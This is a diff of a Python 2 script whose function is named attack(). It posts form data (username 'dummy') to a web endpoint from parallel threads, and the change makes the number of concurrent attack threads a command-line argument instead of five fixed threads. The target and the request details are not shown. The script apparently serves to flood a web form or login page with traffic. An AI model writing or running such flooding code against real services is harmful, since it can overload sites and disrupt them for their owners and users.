@@ -1,6 +1,12 @@
 import urllib
 import urllib2 
 from threading import Thread
+import sys
+
+'''
+the number of threads
+'''
+num = int (sys.argv[1])
 
 data = {
     'username': 'dummy',
@@ -17,14 +23,7 @@ def attack():
 		print the_page
 
 if __name__ == "__main__":
-    thread = Thread(target = attack)
-    thread2 = Thread(target = attack)
-    thread3 = Thread(target = attack)
-    thread4 = Thread(target = attack)
-    thread5 = Thread(target = attack)
-    thread.start()
-    thread2.start()
-    thread3.start()
-    thread4.start()
-    thread5.start()
-    print 'Finished'
+    for k in range(0, num):
+        thread = Thread(target = attack)
+        thread.start()
+        print 'Launched thread '+str(k)
